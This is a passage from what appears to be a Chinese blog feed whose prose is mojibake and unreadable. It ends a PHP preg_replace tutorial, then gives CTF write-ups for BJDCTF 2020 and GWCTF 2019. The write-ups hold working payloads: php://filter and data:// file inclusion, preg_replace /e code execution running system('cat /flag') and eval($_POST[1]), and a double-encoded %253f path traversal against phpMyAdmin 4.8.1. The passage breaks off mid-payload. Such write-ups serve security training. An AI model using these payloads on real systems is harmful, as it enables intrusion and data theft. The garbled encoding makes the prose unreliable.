è¿”å›žåœ¨ç›®æ ‡å­—ç¬¦ä¸²æ‰€æ›¿æ¢çš„æ¬¡æ•°</p><p>åœ¨repalceä¸Žpatternä¸­æœ‰å‡ ç‚¹è¦æ³¨æ„çš„</p><p>1.$patternæ˜¯æ•°ç»„,$replaceä¹Ÿæ˜¯å­—ç¬¦ä¸²,é‚£ä¹ˆæ‰€æœ‰æ¨¡å¼éƒ½ä½¿ç”¨è¿™ä¸ªå­—ç¬¦ä¸²æ¥åŒ¹é…;</p><p><img src="/2021/06/21/php-preg-replace-han-shu-ying-yong/1.png" alt="1"></p><p>2.$patternæ˜¯æ•°ç»„,$replaceä¹Ÿæ˜¯æ•°ç»„,åˆ™ä¸­å¯¹åº”çš„ å…ƒç´ è¿›è¡Œæ›¿æ¢</p><p><img src="/2021/06/21/php-preg-replace-han-shu-ying-yong/2.png" alt="2"></p><p>3.å¦‚æžœæ•°ç»„$patternå¤§äºŽ$replace,åˆ™å¤šå‡ºæ¥çš„$patternç”¨ç©ºçš„å­—ç¬¦ä¸²è¿›è¡Œæ›¿æ¢,</p><p><img src="/2021/06/21/php-preg-replace-han-shu-ying-yong/3.png" alt="3"></p><p>$replaceå°‘äºŽ$patterns,åˆ™åŒ¹é…åˆ°çš„å€¼å…¨éƒ¨ç”¨ç©ºå­—ç¬¦ä¸²æ¥æ›¿æ¢</p><p>4.å¯¹äºŽä¸Šé¢ä¾‹å­ä¸­å‡ºçŽ°çš„${1},${2},${3},è¿™ä¸ªå«åšåŒ…å«åŽå‘å¼•ç”¨,é‡Œé¢çš„æ•°å­—ä»£è¡¨åŽŸå­å‡ºçŽ°çš„ä½æ•°,æœ‰ä¸¤ç§å†™æ³•,ä¸€ç§æ˜¯\n,ä¸€ç§æ˜¯${n},æŽ¨èä½¿ç”¨ç¬¬äºŒç§å†™æ³•.ä¼šæŠŠç›®æ ‡å­—ç¬¦ä¸²åŒ¹é…åˆ°çš„patternä¸­çš„åŽŸå­,æŒ‰ç…§è¦æ±‚å˜åŒ–ç›®æ ‡å­—ç¬¦ä¸²çš„æ ¼å¼,æˆ–è€…åŒ¹é…çš„åŽŸå­åŽŸæ ·è¾“å‡º(è¿™é‡Œä¸¾ä¸¤ä¸ªä¾‹å­)</p><p><img src="/2021/06/21/php-preg-replace-han-shu-ying-yong/4.png" alt="4"></p><p> æŠŠæ—¶é—´æŒ‰ç…§ ä¸‹åˆ’çº¿åˆ†å‰²å¼€æ¥,${3}å°±æ˜¯åŒ¹é…çš„åˆ°$patternsä¸­çš„ç¬¬ä¸‰ä¸ªåŽŸå­((\d{1,2})),${4}å°±æ˜¯åŒ¹é…çš„åˆ°$patternsä¸­çš„ç¬¬å››ä¸ªåŽŸå­((\d{1,2}))ä»¥æ­¤ç±»æŽ¨,</p><p><img src="/2021/06/21/php-preg-replace-han-shu-ying-yong/5.png" alt="5"></p><p>ä¾‹å¦‚å¤§å®¶ç†Ÿæ‚‰çš„smartyæ¨¡æ¿å¼•æ“Žä¸­ç¼–è¯‘åŽæ›¿æ¢çš„æ–¹æ³•</p><p>5.ç¬¬å››ä¸ªå‚æ•°çš„$limitçš„ä½¿ç”¨,ç¬¬å››ä¸ªå‚æ•°çš„æ„æ€æ˜¯æ¯ä¸ªæ¨¡å¼åœ¨æ¯ä¸ªsubjectä¸Šè¿›è¡Œæ›¿æ¢çš„æœ€å¤§æ¬¡æ•°</p><p><img src="/2021/06/21/php-preg-replace-han-shu-ying-yong/6.png" alt="6"></p><p>å¦‚æžœlimitä¸ºn,å®ƒåªç”¨æ­£åˆ™æ›¿æ¢næ¬¡</p><p>6.ç¬¬äº”ä¸ªå‚æ•°$countçš„ä½¿ç”¨,$countçš„æ„æ€æ˜¯,subjectç›®æ ‡å­—ç¬¦ä¸²è¢«æ›¿æ¢çš„æ¬¡æ•°,æ‹¿ç¬¬äº”ç‚¹çš„ä¾‹å­æ¥è¯´</p><p><img src="/2021/06/21/php-preg-replace-han-shu-ying-yong/7.png" alt="7"></p><p>ä¸Šé¢ä»£ç ä¸­çš„ä¾‹å­è¿è¡Œç»“æžœå¦‚ä¸‹:</p><p><img src="/2021/06/21/php-preg-replace-han-shu-ying-yong/8.png" alt="8"></p><p>ps:</p><p>preg_replaceä¸Žstr_replaceçš„å…³ç³»æ˜¯ä»€ä¹ˆå‘¢?</p><p>æˆ‘ä»¬å¯ä»¥ç†è§£ä¸ºstr_replaceæ˜¯preg_repalceçš„ä¸€ä¸ªå­é›†.åªæ˜¯str_replaceä¸­çš„ç¬¬ä¸€ä¸ªå‚æ•°å†™çš„æ˜¯string,è€Œpreg_replaceå†™çš„æ˜¯ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼</p><h1 id="PHPæ­£åˆ™è¡¨è¾¾å¼ä¿®é¥°ç¬¦çš„ç†è§£ï¼š"><a href="#PHPæ­£åˆ™è¡¨è¾¾å¼ä¿®é¥°ç¬¦çš„ç†è§£ï¼š" class="headerlink" title="PHPæ­£åˆ™è¡¨è¾¾å¼ä¿®é¥°ç¬¦çš„ç†è§£ï¼š"></a><strong>PHPæ­£åˆ™è¡¨è¾¾å¼ä¿®é¥°ç¬¦çš„ç†è§£</strong>ï¼š</h1><p>â€‹    åœ¨PHPæ­£åˆ™è¡¨è¾¾å¼é‡Œé¢çš„ä¿®é¥°ç¬¦å¯ä»¥æ”¹å˜æ­£åˆ™çš„å¾ˆå¤šç‰¹æ€§ï¼Œä½¿å¾—æ­£åˆ™è¡¨è¾¾å¼æ›´åŠ é€‚åˆä½ çš„éœ€è¦ï¼ˆæ³¨æ„ï¼šä¿®é¥°ç¬¦å¯¹äºŽå¤§å°å†™æ˜¯æ•æ„Ÿçš„ï¼Œè¿™æ„å‘³ç€â€eâ€å¹¶ä¸ç­‰äºŽâ€Eâ€ï¼‰ã€‚</p><p>â€‹    PHPæ­£åˆ™è¡¨è¾¾å¼ä¿®é¥°ç¬¦çš„ç§ç±»åŠä»‹ç»ï¼š</p><p>â€‹    â—†i ï¼šå¦‚æžœåœ¨ä¿®é¥°ç¬¦ä¸­åŠ ä¸Šâ€iâ€ï¼Œåˆ™æ­£åˆ™å°†ä¼šå–æ¶ˆå¤§å°å†™æ•æ„Ÿæ€§ï¼Œå³â€aâ€å’Œâ€Aâ€ æ˜¯ä¸€æ ·çš„ã€‚</p><p>â€‹    â—†mï¼šé»˜è®¤çš„æ­£åˆ™å¼€å§‹â€^â€å’Œç»“æŸâ€$â€åªæ˜¯å¯¹äºŽæ­£åˆ™å­—ç¬¦ä¸²å¦‚æžœåœ¨ä¿®é¥°ç¬¦ä¸­åŠ ä¸Šâ€mâ€ï¼Œé‚£ä¹ˆå¼€å§‹å’Œç»“æŸå°†ä¼šæŒ‡å­—ç¬¦ä¸²çš„æ¯ä¸€è¡Œï¼šæ¯ä¸€è¡Œçš„å¼€å¤´å°±æ˜¯â€^â€ï¼Œç»“å°¾å°±æ˜¯â€$â€ã€‚</p><p>â€‹    â—†sï¼šå¦‚æžœåœ¨ä¿®é¥°ç¬¦ä¸­åŠ å…¥â€sâ€ï¼Œé‚£ä¹ˆé»˜è®¤çš„â€.â€ä»£è¡¨é™¤äº†æ¢è¡Œç¬¦ä»¥å¤–çš„ä»»ä½•å­—ç¬¦å°†ä¼šå˜æˆä»»æ„å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯åŒ…æ‹¬æ¢è¡Œç¬¦ï¼</p><p>â€‹    â—†xï¼šå¦‚æžœåŠ ä¸Šè¯¥ä¿®é¥°ç¬¦ï¼Œè¡¨è¾¾å¼ä¸­çš„ç©ºç™½å­—ç¬¦å°†ä¼šè¢«å¿½ç•¥ï¼Œé™¤éžå®ƒå·²ç»è¢«è½¬ä¹‰ã€‚</p><p>â€‹    â—†eï¼šæœ¬ä¿®é¥°ç¬¦ä»…ä»…å¯¹äºŽreplacementæœ‰ç”¨ï¼Œä»£è¡¨åœ¨replacementä¸­ä½œä¸ºPHPä»£ç ã€‚</p><p>â€‹    â—†Aï¼šå¦‚æžœä½¿ç”¨è¿™ä¸ªä¿®é¥°ç¬¦ï¼Œé‚£ä¹ˆè¡¨è¾¾å¼å¿…é¡»æ˜¯åŒ¹é…çš„å­—ç¬¦ä¸²ä¸­çš„å¼€å¤´éƒ¨åˆ†ã€‚æ¯”å¦‚è¯´â€/a/Aâ€åŒ¹é…â€abcdâ€ã€‚</p><p>â€‹    â—†Eï¼šä¸Žâ€mâ€ç›¸åï¼Œå¦‚æžœä½¿ç”¨è¿™ä¸ªä¿®é¥°ç¬¦ï¼Œé‚£ä¹ˆâ€$â€å°†åŒ¹é…ç»å¯¹å­—ç¬¦ä¸²çš„ç»“å°¾ï¼Œè€Œä¸æ˜¯æ¢è¡Œç¬¦å‰é¢ï¼Œé»˜è®¤å°±æ‰“å¼€äº†è¿™ä¸ªæ¨¡å¼ã€‚</p><p>â€‹    â—†Uï¼šå’Œé—®å·çš„ä½œç”¨å·®ä¸å¤šï¼Œç”¨äºŽè®¾ç½®â€è´ªå©ªæ¨¡å¼â€ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF:2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤</title>
      <link href="2021/06/21/bjdctf-2020-zjctf-bu-guo-ru-ci/"/>
      <url>2021/06/21/bjdctf-2020-zjctf-bu-guo-ru-ci/</url>
      
        <content type="html"><![CDATA[<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$text</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"text"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string">"I have a dream"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;h1>"</span><span class="token punctuation">.</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"&lt;/h1>&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/flag/"</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Not now!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//next.php</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>è¦æ±‚ï¼š</p><p>1.textå†…å®¹I have a dream</p><p>2.fileä¸­ä¸èƒ½å«æœ‰flagå­—æ®µ</p><pre><code>?text=data://text/plain,I%20have%20a%20dream&amp;file=php://filter/read=convert.base64- encode/resource=next.php</code></pre><p>æˆ–è€…ï¼š</p><pre><code>?text=php://input&amp;file=php://filter/convert.base64-encode/resource=next.phpPOST:I have a dream</code></pre><p><img src="/2021/06/21/bjdctf-2020-zjctf-bu-guo-ru-ci/1.png" alt="1"></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$id</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span>        <span class="token string">'/('</span> <span class="token punctuation">.</span> <span class="token variable">$re</span> <span class="token punctuation">.</span> <span class="token string">')/ei'</span><span class="token punctuation">,</span>        <span class="token string">'strtolower("\\1")'</span><span class="token punctuation">,</span>        <span class="token variable">$str</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$re</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a>preg_replace</h3><pre><code>preg_replace(pattern, replacement, subject)</code></pre><p><strong>å½“patternä¼ å…¥çš„æ­£åˆ™è¡¨è¾¾å¼å¸¦æœ‰/eæ—¶ï¼Œå­˜åœ¨å‘½ä»¤æ‰§è¡Œï¼Œå³å½“åŒ¹é…åˆ°ç¬¦åˆæ­£åˆ™è¡¨è¾¾å¼çš„å­—ç¬¦ä¸²æ—¶ï¼Œç¬¬äºŒä¸ªå‚æ•°çš„å­—ç¬¦ä¸²å¯è¢«å½“åšä»£ç æ¥æ‰§è¡Œã€‚</strong><br>è¿™é‡Œç¬¬äºŒä¸ªå‚æ•°å›ºå®šä¸º<code>strtolower("\\1")</code><br>è¿™é‡Œçš„\1å®žé™…ä¸Šä½“çŽ°ä¸º\1å¯¹ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼æˆ–éƒ¨åˆ†æ¨¡å¼ä¸¤è¾¹æ·»åŠ åœ†æ‹¬å·å°†å¯¼è‡´ç›¸å…³åŒ¹é…å­˜å‚¨åˆ°ä¸€ä¸ªä¸´æ—¶ç¼“å†²åŒºä¸­ï¼Œæ‰€æ•èŽ·çš„æ¯ä¸ªå­åŒ¹é…éƒ½æŒ‰ç…§åœ¨æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼ä¸­ä»Žå·¦åˆ°å³å‡ºçŽ°çš„é¡ºåºå­˜å‚¨ã€‚ç¼“å†²åŒºç¼–å·ä»Ž 1 å¼€å§‹ï¼Œæœ€å¤šå¯å­˜å‚¨ 99 ä¸ªæ•èŽ·çš„å­è¡¨è¾¾å¼ã€‚æ¯ä¸ªç¼“å†²åŒºéƒ½å¯ä»¥ä½¿ç”¨ â€˜\nâ€™ è®¿é—®</p><p>è¿™é‡Œçš„\1æŒ‡çš„æ˜¯ç¬¬ä¸€ä¸ªåŒ¹é…é¡¹<br>å®˜æ–¹<code>payload/?.*={${phpinfo()}}</code><br>å³</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/(.*)/ei'</span><span class="token punctuation">,</span><span class="token string">'strtolower("\\1")'</span><span class="token punctuation">,</span><span class="token string">'{${phpinfo()}}'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>ä½†è¿™é‡Œå­˜åœ¨çš„é—®é¢˜æ˜¯ï¼ŒGETæ–¹å¼ä¼ çš„å­—ç¬¦ä¸²ï¼Œ.ä¼šè¢«æ›¿æ¢æˆ_ï¼Œè¿™é‡Œé‡‡ç”¨</p><pre><code>\S*=${phpinfo()}  #\S åœ¨phpæ­£åˆ™è¡¨è¾¾å¼ä¸­è¡¨ç¤ºåŒ¹é…æ‰€æœ‰éžç©ºå­—ç¬¦ï¼Œ*è¡¨ç¤ºå¤šæ¬¡åŒ¹é…/</code></pre><pre><code>/next.php?\S*=${getflag()}&amp;cmd=system('cat /flag');</code></pre><p><img src="/2021/06/21/bjdctf-2020-zjctf-bu-guo-ru-ci/2.png" alt="2"></p><pre class=" language-php"><code class="language-php">next<span class="token punctuation">.</span>php<span class="token operator">?</span>\<span class="token package">S</span><span class="token operator">*</span><span class="token operator">=</span>$<span class="token punctuation">{</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token constant">POST</span>ï¼š<span class="token number">1</span><span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cat /flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><img src="/2021/06/21/bjdctf-2020-zjctf-bu-guo-ru-ci/3.png" alt="3"></p><p>å¯ä»¥çœ‹ï¼š<a href="https://blog.csdn.net/qq_43622442/article/details/106018883">https://blog.csdn.net/qq_43622442/article/details/106018883</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>GWCTF:2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“</title>
      <link href="2021/06/20/gwctf-2019-wo-you-yi-ge-shu-ju-ku/"/>
      <url>2021/06/20/gwctf-2019-wo-you-yi-ge-shu-ju-ku/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/06/20/gwctf-2019-wo-you-yi-ge-shu-ju-ku/image-20210620144400661.png" alt="image-20210620144400661"></p><p>å¾¡å‰‘æ‰«æè¿›å…¥/phpmyadmin/</p><p><img src="/2021/06/20/gwctf-2019-wo-you-yi-ge-shu-ju-ku/image-20210620144454591.png" alt="image-20210620144454591"></p><p>æ²¡ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„æŸ¥çœ‹äº†<strong>PHPç‰ˆæœ¬4.8.1</strong>ç™¾åº¦ç‰ˆæœ¬æ¼æ´žï¼š</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'target'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//æ£€æµ‹éžç©º</span>    <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'target'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//æ£€æµ‹å­—ç¬¦ä¸²</span>    <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^index/'</span><span class="token punctuation">,</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'target'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//è¿‡æ»¤index</span>    <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'target'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$target_blacklist</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//è¿‡æ»¤é»‘åå•</span>    <span class="token operator">&amp;&amp;</span> Core<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">checkPageValidity</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'target'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//è°ƒç”¨Core::checkPageValidity</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'target'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    exit<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>blacklist:</p><pre class=" language-php"><code class="language-php"><span class="token variable">$target_blacklist</span> <span class="token operator">=</span> <span class="token keyword">array</span> <span class="token punctuation">(</span>    <span class="token string">'import.php'</span><span class="token punctuation">,</span> <span class="token string">'export.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>Core::checkPageValidity($_REQUEST[â€˜targetâ€™]):</p><pre class=" language-php"><code class="language-php"> <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">checkPageValidity</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token keyword">array</span> <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$whitelist</span> <span class="token operator">=</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$goto_whitelist</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token comment" spellcheck="true">//æ£€æµ‹å˜é‡å’Œå­—ç¬¦</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//åœ¨whilelisté‡Œæœç´¢$page</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>            <span class="token variable">$page</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//æŸ¥æ‰¾?åœ¨$pageä¸­é¦–æ¬¡å‡ºçŽ°ä½ç½®</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>            <span class="token variable">$_page</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>urldecode($page)æ–¹æ³•ï¼Œå­˜åœ¨äºŒæ¬¡ç¼–ç ç»•è¿‡</p><ul><li>%25çš„urlç¼–ç ä¸º%</li><li>%3fçš„urlç¼–ç ä¸º?</li><li>%253fâ€“&gt;?</li></ul><p>éªŒè¯ç™½åå•ï¼š</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token variable">$goto_whitelist</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>        <span class="token string">'db_datadict.php'</span><span class="token punctuation">,</span>        <span class="token string">'db_sql.php'</span><span class="token punctuation">,</span>        <span class="token string">'db_events.php'</span><span class="token punctuation">,</span>        <span class="token string">'db_export.php'</span><span class="token punctuation">,</span>        <span class="token string">'db_importdocsql.php'</span><span class="token punctuation">,</span>        <span class="token string">'db_multi_table_query.php'</span><span class="token punctuation">,</span>        <span class="token string">'db_structure.php'</span><span class="token punctuation">,</span>        <span class="token string">'db_import.php'</span><span class="token punctuation">,</span>        <span class="token string">'db_operations.php'</span><span class="token punctuation">,</span>        <span class="token string">'db_search.php'</span><span class="token punctuation">,</span>        <span class="token string">'db_routines.php'</span><span class="token punctuation">,</span>        <span class="token string">'export.php'</span><span class="token punctuation">,</span>        <span class="token string">'import.php'</span><span class="token punctuation">,</span>        <span class="token string">'index.php'</span><span class="token punctuation">,</span>        <span class="token string">'pdf_pages.php'</span><span class="token punctuation">,</span>        <span class="token string">'pdf_schema.php'</span><span class="token punctuation">,</span>        <span class="token string">'server_binlog.php'</span><span class="token punctuation">,</span>        <span class="token string">'server_collations.php'</span><span class="token punctuation">,</span>        <span class="token string">'server_databases.php'</span><span class="token punctuation">,</span>        <span class="token string">'server_engines.php'</span><span class="token punctuation">,</span>        <span class="token string">'server_export.php'</span><span class="token punctuation">,</span>        <span class="token string">'server_import.php'</span><span class="token punctuation">,</span>        <span class="token string">'server_privileges.php'</span><span class="token punctuation">,</span>        <span class="token string">'server_sql.php'</span><span class="token punctuation">,</span>        <span class="token string">'server_status.php'</span><span class="token punctuation">,</span>        <span class="token string">'server_status_advisor.php'</span><span class="token punctuation">,</span>        <span class="token string">'server_status_monitor.php'</span><span class="token punctuation">,</span>        <span class="token string">'server_status_queries.php'</span><span class="token punctuation">,</span>        <span class="token string">'server_status_variables.php'</span><span class="token punctuation">,</span>        <span class="token string">'server_variables.php'</span><span class="token punctuation">,</span>        <span class="token string">'sql.php'</span><span class="token punctuation">,</span>        <span class="token string">'tbl_addfield.php'</span><span class="token punctuation">,</span>        <span class="token string">'tbl_change.php'</span><span class="token punctuation">,</span>        <span class="token string">'tbl_create.php'</span><span class="token punctuation">,</span>        <span class="token string">'tbl_import.php'</span><span class="token punctuation">,</span>        <span class="token string">'tbl_indexes.php'</span><span class="token punctuation">,</span>        <span class="token string">'tbl_sql.php'</span><span class="token punctuation">,</span>        <span class="token string">'tbl_export.php'</span><span class="token punctuation">,</span>        <span class="token string">'tbl_operations.php'</span><span class="token punctuation">,</span>        <span class="token string">'tbl_structure.php'</span><span class="token punctuation">,</span>        <span class="token string">'tbl_relation.php'</span><span class="token punctuation">,</span>        <span class="token string">'tbl_replace.php'</span><span class="token punctuation">,</span>        <span class="token string">'tbl_row_action.php'</span><span class="token punctuation">,</span>        <span class="token string">'tbl_select.php'</span><span class="token punctuation">,</span>        <span class="token string">'tbl_zoom_select.php'</span><span class="token punctuation">,</span>        <span class="token string">'transformation_overview.php'</span><span class="token punctuation">,</span>        <span class="token string">'transformation_wrapper.php'</span><span class="token punctuation">,</span>        <span class="token string">'user_password.php'</span><span class="token punctuation">,</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>ç›´æŽ¥åˆ©ç”¨ç»“æžœï¼š</p><pre class=" language-php"><code class="language-php">target<span class="token operator">=</span>db_sql<span class="token punctuation">.</span>php<span class="token operator">%</span>253f<span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token 